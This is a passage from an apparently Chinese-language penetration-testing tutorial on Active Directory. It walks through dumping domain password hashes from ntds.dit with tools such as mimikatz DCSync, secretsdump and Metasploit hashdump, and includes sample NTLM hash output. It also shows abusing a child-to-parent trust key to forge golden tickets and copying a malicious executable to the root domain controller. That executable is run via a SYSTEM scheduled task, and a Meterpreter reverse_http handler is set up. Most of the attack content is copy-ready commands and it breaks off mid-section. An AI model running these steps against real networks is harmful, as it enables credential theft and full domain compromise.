id="1、安装esedbexport"><a href="#1、安装esedbexport" class="headerlink" title="1、安装esedbexport"></a>1、安装esedbexport</h3><p>github下载地址：<a href="https://github.com/libyal/libesedb/releases/">https://github.com/libyal/libesedb/releases/</a></p><p>我们以kali为例子</p><pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https://github.com/libyal/libesedb/releases/download/20230318/libesedb-experimental-20230318.tar.gztar zxvf libesedb-experimental-20230318.tar.gzcd libesedb-20230318./configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、导出ntds-dit"><a href="#2、导出ntds-dit" class="headerlink" title="2、导出ntds.dit"></a>2、导出ntds.dit</h3><p><strong>两个重要的表为: datatable以及link table, 他们都会被存放在./ntds.dit.export/文件夹中</strong></p><pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、安装ntdsxtract"><a href="#3、安装ntdsxtract" class="headerlink" title="3、安装ntdsxtract"></a>3、安装ntdsxtract</h3><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtractpython2 setup.py buildpython2 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果提示ImportError: No module named Crypto.Hash,请执行</strong></p><pre class="line-numbers language-none"><code class="language-none">curl -o get-pip.py https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2 get-pip.pypip install pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4、导出哈希值"><a href="#4、导出哈希值" class="headerlink" title="4、导出哈希值"></a>4、导出哈希值</h3><p>将<strong>ntds.dit.export和SYSTEM文件</strong>放入到<strong>ntdsxtract工具的文件夹</strong>中，然后导出哈希值，最后的结果将保存在1.txt里</p><pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h2><p>将ntds.dit.export和SYSTEM文件放入到和<strong>secretsdump.exe</strong>同级目录下</p><pre class="line-numbers language-none"><code class="language-none">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230412133801934.png" alt="image-20230412133801934"></p><h2 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h2><p><strong>NTDSDumpEx.exe可以进行导出哈希值的操作</strong></p><p>github下载:<a href="https://github.com/zcgonvh/NTDSDumpEx/releases/tag/v0.3">https://github.com/zcgonvh/NTDSDumpEx/releases/tag/v0.3</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hive -o 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC:1001:aad3b435b51404eeaad3b435b51404ee:1f0e20e21088dae3bfcfcf6d5f8bd98e:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d5adb4aa3a471374f46ba24ba01cb08b:::jack:1105:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::jack:1106:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::jack:1107:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::jack:1108:aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d:::lihua:1110:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::lihua:1111:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::lihua:1112:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::lihua:1113:aad3b435b51404eeaad3b435b51404ee:68faaeedea6e05549453d18b03c6a8d2:::kkk:1118:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h2><p>DSInternals是powershell脚本，可以离线读取ntds文件</p><p>github下载：<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><h3 id="安装DSInternals"><a href="#安装DSInternals" class="headerlink" title="安装DSInternals"></a>安装DSInternals</h3><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出hash-并保存在txt文件里"><a href="#导出hash-并保存在txt文件里" class="headerlink" title="导出hash,并保存在txt文件里"></a>导出hash,并保存在txt文件里</h3><pre class="line-numbers language-none"><code class="language-none">$key = Get-Bootkey -SystemHivePath 'system路径'Get-ADDBAccount -All -DBPath 'ntds路径' -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="在线方式读取ntds-dit文件"><a href="#在线方式读取ntds-dit文件" class="headerlink" title="在线方式读取ntds.dit文件"></a>在线方式读取ntds.dit文件</h1><p>在线的方式就是直接读取不需要在导出ntds文件,在域环境中，不要直接在线获取hash,特别是域环境比较大的时<br>候，在线获取hash等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><h3 id="1、可以读取所有用户的hash"><a href="#1、可以读取所有用户的hash" class="headerlink" title="1、可以读取所有用户的hash"></a>1、可以读取所有用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /domain:hack.com /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、也可以读取单个用户的hash"><a href="#2、也可以读取单个用户的hash" class="headerlink" title="2、也可以读取单个用户的hash"></a>2、也可以读取单个用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /domain:hack.com /user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h2><p>1、上传工具到目标机器，使用命令先导出ntds文件，然后直接读取</p><pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe --dump-hash-domain --ntds-file ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h2><p><strong>使用secretsdump直接读取</strong></p><pre class="line-numbers language-none"><code class="language-none">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntdseg: secretsdump.exe hack/administrator:123456kl;'@192.168.70.16 -outputfile 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Invoke-DCSync"><a href="#Invoke-DCSync" class="headerlink" title="Invoke-DCSync"></a>Invoke-DCSync</h2><p>github下载：<a href="https://github.com/Al1ex/Invoke-DCSync">https://github.com/Al1ex/Invoke-DCSync</a></p><p>Invoke-DCSyncs是powershell脚本可以在线读取内存中的用户hash</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="MSF读取ntds-dit文件"><a href="#MSF读取ntds-dit文件" class="headerlink" title="MSF读取ntds.dit文件"></a>MSF读取ntds.dit文件</h1><h2 id="离线读取"><a href="#离线读取" class="headerlink" title="离线读取"></a>离线读取</h2><p>离线读取使用<strong>msf</strong>读取ntds文件，前提是msf必须和域控相同，我们可以使用代理技术,将msf代理到内网,然后<br>使用msf导出ntds文件</p><h3 id="1、使用导出模块进行导出"><a href="#1、使用导出模块进行导出" class="headerlink" title="1、使用导出模块进行导出"></a>1、使用导出模块进行导出</h3><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse auxiliary/admin/smb/psexec_ntdsgrab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2、填写相关的选项，主要有IP，域，-用户名和密码"><a href="#2、填写相关的选项，主要有IP，域，-用户名和密码" class="headerlink" title="2、填写相关的选项，主要有IP，域， 用户名和密码"></a>2、填写相关的选项，主要有IP，域， 用户名和密码</h3><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.70.16set SMBDomain hack.comset smbuser administratorset smbpass "123456kl;'"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、运行之后ntds和system文件会被保存到-x2F-root-x2F-msf4-x2F-loot下"><a href="#3、运行之后ntds和system文件会被保存到-x2F-root-x2F-msf4-x2F-loot下" class="headerlink" title="3、运行之后ntds和system文件会被保存到/root/.msf4/loot下"></a>3、运行之后ntds和system文件会被保存到/root/.msf4/loot下</h3><pre class="line-numbers language-none"><code class="language-none">Running module against 192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="在线读取"><a href="#在线读取" class="headerlink" title="在线读取"></a>在线读取</h2><h3 id="1、使用cs或者其他的方式先上线的msf中使用派生会话的方式"><a href="#1、使用cs或者其他的方式先上线的msf中使用派生会话的方式" class="headerlink" title="1、使用cs或者其他的方式先上线的msf中使用派生会话的方式"></a>1、使用cs或者其他的方式先上线的msf中使用<strong>派生</strong>会话的方式</h3><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.70.3set lport 6666exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-拿到shell之后执行hashdump"><a href="#2-拿到shell之后执行hashdump" class="headerlink" title="2.拿到shell之后执行hashdump"></a>2.拿到shell之后执行<code>hashdump</code></h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不能执行就<strong>迁移</strong>进程到64位中</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getpidmeterpreter &gt; psmeterpreter &gt; migrate 532meterpreter &gt; hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f4766727c46a2891f71c237b518727d5:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d5adb4aa3a471374f46ba24ba01cb08b:::DC:1001:aad3b435b51404eeaad3b435b51404ee:1f0e20e21088dae3bfcfcf6d5f8bd98e:::jack:1108:aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d:::lihua:1113:aad3b435b51404eeaad3b435b51404ee:68faaeedea6e05549453d18b03c6a8d2:::kkk:1118:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::DC$:1002:aad3b435b51404eeaad3b435b51404ee:5717ea7a3688384a618e60400cfdb35c:::PC-MB$:1117:aad3b435b51404eeaad3b435b51404ee:40e3866bd78eb3bcfc9b137e111eee06:::PC-GYX$:1119:aad3b435b51404eeaad3b435b51404ee:009d1c712c2ec3f9b4344dce33b40c73:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、或者使用下面的脚本，也可以读取域内的hash"><a href="#3、或者使用下面的脚本，也可以读取域内的hash" class="headerlink" title="3、或者使用下面的脚本，也可以读取域内的hash"></a>3、或者使用下面的脚本，也可以读取域内的hash</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; backgroundmsf6 exploit(multi/handler) &gt; sessions msf6 exploit(multi/handler) &gt; use post/windows/gather/smart_hashdumpmsf6 post(windows/gather/smart_hashdump) &gt; show optionsmsf6 post(windows/gather/smart_hashdump) &gt; set session 1msf6 post(windows/gather/smart_hashdump) &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="跨域攻击介绍"><a href="#跨域攻击介绍" class="headerlink" title="跨域攻击介绍"></a>跨域攻击介绍</h1><h2 id="内网中的域林"><a href="#内网中的域林" class="headerlink" title="内网中的域林"></a>内网中的域林</h2><p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门,从逻辑上以主域和子<br>域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p><p><img src="assets/image-20230412200223351.png" alt="image-20230412200223351"></p><h2 id="跨域攻击方法"><a href="#跨域攻击方法" class="headerlink" title="跨域攻击方法"></a>跨域攻击方法</h2><ol><li>常规渗透方法(利用web漏洞)</li><li>哈希传递票据攻击</li><li>利用域信任关系</li></ol><p><img src="assets/image-20230412201336539.png" alt="image-20230412201336539"></p><h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的<strong>管理和维<br>护</strong>，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用<br>DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域， 也就不存在通过域信<br>任关系进行跨域资源共享了</p><h2 id="域信任关系分类"><a href="#域信任关系分类" class="headerlink" title="域信任关系分类"></a>域信任关系分类</h2><p>域信任关系分为<strong>单向信任和双向信任</strong></p><p>单向信任:是指在两个域之间创建单向的信任路径，即在一一个方向上是信任流，在另一个方向上是访问流，受信<br>任域内的用户(或者计算机)可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。也就是<br>说，A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。</p><p>双向信任:是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味<br>着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向可传递的。在创建子<br>域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通关其父域向<br>上流向信任域</p><p>域信任关系也可以分为<strong>内部信任和外部信任</strong></p><p>内部信任:在默认情况下,用活动目录安装向导将新域添加到域树或林根域中，会自动创建双向可传递信任。在现<br>有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为内部信任。这种信<br>任关系是可传递的。例如，有三个子域BA,CA,DA,BA域信任CA域，CA域信任DA域，则BA域也信任DA域。</p><p>外部信任是指两个不同林中的域的信任关系。<strong>外部信任是不可传递的，而且是单向的。</strong></p><p>只有domain admins组中的用户可以管理域信任关系</p><p><img src="assets/image-20230412202011889.png" alt="image-20230412202011889"></p><h1 id="搭建和查看域信任关系"><a href="#搭建和查看域信任关系" class="headerlink" title="搭建和查看域信任关系"></a>搭建和查看域信任关系</h1><h2 id="搭建域树-内部信任"><a href="#搭建域树-内部信任" class="headerlink" title="搭建域树(内部信任)"></a>搭建域树(内部信任)</h2><p><strong>如果是复制的虚拟机请运行</strong><code>C:\Windows\System32\sysprep\sysprep.exe</code>重新获取SID</p><h3 id="1、修改计算机名和修改IP地址，DNS指向父域"><a href="#1、修改计算机名和修改IP地址，DNS指向父域" class="headerlink" title="1、修改计算机名和修改IP地址，DNS指向父域"></a>1、修改计算机名和修改IP地址，DNS指向父域</h3><pre class="line-numbers language-none"><code class="language-none">计算机名称：win2012-dc2ip:192.168.70.17dns:192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2、安装AD域服务"><a href="#2、安装AD域服务" class="headerlink" title="2、安装AD域服务"></a>2、安装AD域服务</h3><p><img src="assets/image-20230412202740518.png" alt="image-20230412202740518"></p><h3 id="3、升级为域控"><a href="#3、升级为域控" class="headerlink" title="3、升级为域控"></a>3、升级为域控</h3><p><img src="assets/image-20230413151917330.png" alt="image-20230413151917330"></p><h3 id="4、添加到现有林"><a href="#4、添加到现有林" class="headerlink" title="4、添加到现有林"></a>4、添加到现有林</h3><p><img src="assets/image-20230413151950891.png" alt="image-20230413151950891"></p><pre class="line-numbers language-none"><code class="language-none">选择域类型：子域父域：hack.com新域：abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5、提供父域的账号密码"><a href="#5、提供父域的账号密码" class="headerlink" title="5、提供父域的账号密码"></a>5、提供父域的账号密码</h3><p><img src="assets/image-20230413152542608.png" alt="image-20230413152542608"></p><pre class="line-numbers language-none"><code class="language-none">提供凭证:账号：hack\administrator密码：123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6、正常安装直到结束"><a href="#6、正常安装直到结束" class="headerlink" title="6、正常安装直到结束"></a>6、正常安装直到结束</h3><h2 id="搭建域森林-外部信任"><a href="#搭建域森林-外部信任" class="headerlink" title="搭建域森林(外部信任)"></a>搭建域森林(外部信任)</h2><h3 id="1、修改计算机名和修改IP地址，DNS指向根域"><a href="#1、修改计算机名和修改IP地址，DNS指向根域" class="headerlink" title="1、修改计算机名和修改IP地址，DNS指向根域"></a>1、修改计算机名和修改IP地址，DNS指向根域</h3><pre class="line-numbers language-none"><code class="language-none">计算机名称：win2012-dc3ip:192.168.70.18dns:192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2、安装AD域服务-1"><a href="#2、安装AD域服务-1" class="headerlink" title="2、安装AD域服务"></a>2、安装AD域服务</h3><h3 id="3、升级为域控-1"><a href="#3、升级为域控-1" class="headerlink" title="3、升级为域控"></a>3、升级为域控</h3><h3 id="4、添加到现有林-1"><a href="#4、添加到现有林-1" class="headerlink" title="4、添加到现有林"></a>4、添加到现有林</h3><p><img src="assets/image-20230413160049365.png" alt="image-20230413160049365"></p><pre class="line-numbers language-none"><code class="language-none">选择域类型：树域林名称：hack.com新域名：wanli.com提供凭证:账号：hack\administrator密码：123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、正常安全即可</p><h2 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h2><p>在域中，<strong>Enterprise Admins组</strong>(出现在林中的<strong>根域</strong>中)的成员具有对目录林中所有域的完全控制权限。在默认情况下，该组包含林中所有域控制器上具有<strong>Administrators</strong>权限的成员</p><h3 id="查看当前域中计算机的权限"><a href="#查看当前域中计算机的权限" class="headerlink" title="查看当前域中计算机的权限"></a>查看当前域中计算机的权限</h3><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用lg工具获取域的相关信息"><a href="#使用lg工具获取域的相关信息" class="headerlink" title="使用lg工具获取域的相关信息"></a>使用lg工具获取域的相关信息</h3><p><strong>下载地址：<a href="http://www.joeware.net/freetools/tools/lg/index.htm">http://www.joeware.net/freetools/tools/lg/index.htm</a></strong></p><h4 id="查看域信任关系"><a href="#查看域信任关系" class="headerlink" title="查看域信任关系"></a>查看域信任关系</h4><pre class="line-numbers language-none"><code class="language-none">nltest /domaun_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230413193906340.png" alt="image-20230413193906340"></p><h4 id="获取当前域中的用户组"><a href="#获取当前域中的用户组" class="headerlink" title="获取当前域中的用户组"></a>获取当前域中的用户组</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe 域名\.eg:LG.exe abc\.LG.exe hack\.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230413205440254.png" alt="image-20230413205440254"></p><h4 id="获取远程机器的本地用户组"><a href="#获取远程机器的本地用户组" class="headerlink" title="获取远程机器的本地用户组"></a>获取远程机器的本地用户组</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe \\计算机名 -lueg:LG.exe \\dc -luLG.exe \\win2012-dc2 -lu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230413205654909.png" alt="image-20230413205654909"></p><p><img src="assets/image-20230413205934261.png" alt="image-20230413205934261"></p><h4 id="获取远程系统中的用户SID"><a href="#获取远程系统中的用户SID" class="headerlink" title="获取远程系统中的用户SID"></a>获取远程系统中的用户SID</h4><pre class="line-numbers language-none"><code class="language-none">LG.exe \\计算机名 -lu -sidsouteg:LG.exe \\dc -lu -sidsoutLG.exe \\win2012-pc2 -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230413210317674.png" alt="image-20230413210317674"></p><p><img src="assets/image-20230413210359274.png" alt="image-20230413210359274"></p><h1 id="利用域信任密钥获取目标域"><a href="#利用域信任密钥获取目标域" class="headerlink" title="利用域信任密钥获取目标域"></a>利用域信任密钥获取目标域</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><table><thead><tr><th>IP地址</th><th>所属域</th><th>域中地位</th><th>机器名</th><th>当前登录用户</th></tr></thead><tbody><tr><td>192.168.70.16</td><td>hack.com</td><td>根域的域控</td><td>dc</td><td>hack\administrator</td></tr><tr><td>192.1 68.70.17</td><td>abc.hack.com</td><td>子域的域控</td><td>win2012-DC2</td><td>abc\administrator</td></tr><tr><td>192.168.70.19</td><td>abc.hack.com</td><td>子域中的机器</td><td>pc-sz</td><td>abc\liwei</td></tr></tbody></table><p><strong>当前已经控制abc.hack.com域，其中包括win2012-DC2 机器 和 pc-sz机器</strong></p><p><img src="assets/image-20230413210930475.png" alt="image-20230413210930475"></p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="当前无法访问DC-HACK-COM"><a href="#当前无法访问DC-HACK-COM" class="headerlink" title="当前无法访问DC.HACK.COM"></a><strong>当前无法访问DC.HACK.COM</strong></h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域信任关系-1"><a href="#查看域信任关系-1" class="headerlink" title="查看域信任关系"></a><strong>查看域信任关系</strong></h3><pre class="line-numbers language-none"><code class="language-none">nltest /domaun_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用mimikatz获取"><a href="#使用mimikatz获取" class="headerlink" title="使用mimikatz获取"></a>使用mimikatz获取</h3><p><strong>当前域的SID 、父域的SID 、子域域管的NTLM、信任密钥</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "lsadump::lsa /patch /user:HACK$" "lsadump::trust /patch" exitmimikatz lsadump::trust /patchmimikatz lsadump::lsa /patch /user:HACK$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230414144204852.png" alt="image-20230414144204852"></p><pre class="line-numbers language-none"><code class="language-none">当前域的SID:Current domain: ABC.HACK.COM (ABC / S-1-5-21-3680861422-3487063359-3354113185)父域的SID:Domain: HACK.COM (HACK / S-1-5-21-3769107300-1842393386-2897162586)信任密钥:[  In ] ABC.HACK.COM -&gt; HACK.COM* rc4_hmac_nt       2888e20ad4fc91ca391f9f0e0cfe37e6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在普通的域内用户中创建创建高权限票据"><a href="#在普通的域内用户中创建创建高权限票据" class="headerlink" title="在普通的域内用户中创建创建高权限票据"></a>在普通的域内用户中创建创建高权限票据</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi" exiteg:mimikatz kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-3680861422-3487063359-3354113185 /sids:S-1-5-21-3769107300-1842393386-2897162586-519 /rc4:2888e20ad4fc91ca391f9f0e0cfe37e6 /user:administrator /service:krbtgt /target:hack.com /ticket:administrator.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>生成administrator.kirbi票据</strong></p><p><img src="assets/image-20230414150155523.png" alt="image-20230414150155523"></p><h3 id="上传asktgs-exe和kirbikator-exe工具"><a href="#上传asktgs-exe和kirbikator-exe工具" class="headerlink" title="上传asktgs.exe和kirbikator.exe工具"></a>上传asktgs.exe和kirbikator.exe工具</h3><p>github下载：<a href="https://github.com/NotScortator/asktgs_compiled">https://github.com/NotScortator/asktgs_compiled</a></p><p><strong>asktgs.exe伪造票据， kirbikator.exe注入票据</strong></p><h3 id="创建CIFS服务的票据进行复制文件的操作"><a href="#创建CIFS服务的票据进行复制文件的操作" class="headerlink" title="创建CIFS服务的票据进行复制文件的操作"></a>创建CIFS服务的票据进行复制文件的操作</h3><pre class="line-numbers language-none"><code class="language-none">shell asktgs.exe administrator.kirbi CIFS/DC.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>生成CIFS.DC.hack.com.kirbi票据</strong></p><p><strong>注意：票据假的就是假的，只能用一次，用完就会失效，及时清理票据<code>klist purge</code></strong></p><h3 id="将票据注入内存"><a href="#将票据注入内存" class="headerlink" title="将票据注入内存"></a>将票据注入内存</h3><pre class="line-numbers language-none"><code class="language-none">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="访问域控"><a href="#访问域控" class="headerlink" title="访问域控"></a>访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="复制恶意文件"><a href="#复制恶意文件" class="headerlink" title="复制恶意文件"></a>复制恶意文件</h3><p><strong>如果复制失败，请注入host服务票据。</strong></p><pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="伪造host服务，进行创建计划任务"><a href="#伪造host服务，进行创建计划任务" class="headerlink" title="伪造host服务，进行创建计划任务"></a>伪造host服务，进行创建计划任务</h3><pre class="line-numbers language-none"><code class="language-none">shell asktgs.exe administrator.kirbi host/DC.hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>生成host.DC.hack.com.kirbi票据</strong></p><h3 id="将票据注入内存-1"><a href="#将票据注入内存-1" class="headerlink" title="将票据注入内存"></a>将票据注入内存</h3><pre class="line-numbers language-none"><code class="language-none">shell kirbikator.exe lsa host.DC.hack.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h3><pre class="line-numbers language-none"><code class="language-none">复制恶意文件shell copy 1.exe \\dc.hack.com\c$创建计划任务shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /f执行计划任务shell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="域内委派根据概述"><a href="#域内委派根据概述" class="headerlink" title="域内委派根据概述"></a>域内委派根据概述</h1><h2 id="委派是什么"><a href="#委派是什么" class="headerlink" title="委派是什么"></a>委派是什么</h2><p><strong>我们先看一下kerberos协议</strong></p><p><img src="assets/image-20230414174833287.png" alt="image-20230414174833287"></p><p><strong>我们要去买票，但是自己又不想去，我们就可以委托中间商，给我们买票，这个就是委派</strong></p><p><img src="assets/image-20230414175110546.png" alt="image-20230414175110546"></p><p><strong>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。</strong></p><p><strong>委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种:</strong></p><ol><li>非约束性委派</li><li>约束性委派;</li><li>基于资源的约束性委派</li></ol><h2 id="委派攻击的工作场景"><a href="#委派攻击的工作场景" class="headerlink" title="委派攻击的工作场景"></a>委派攻击的工作场景</h2><p><strong>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派</strong></p><p><img src="assets/image-20230414175657946.png" alt="image-20230414175657946"></p><h2 id="怎么设置委派"><a href="#怎么设置委派" class="headerlink" title="怎么设置委派"></a>怎么设置委派</h2><p><strong>在域内只有 主机账号 和 服务账号 才有委派属性</strong></p><p><strong>主机账号:活动目录中的computers组内的计算机，也被称为机器账号。</strong></p><p><img src="assets/image-20230414180359456.png" alt="image-20230414180359456"></p><p><strong>服务账号:域内用户的一种类型，是服务器运行服务时所用的账号,将服务运行起来加入域内，比如: 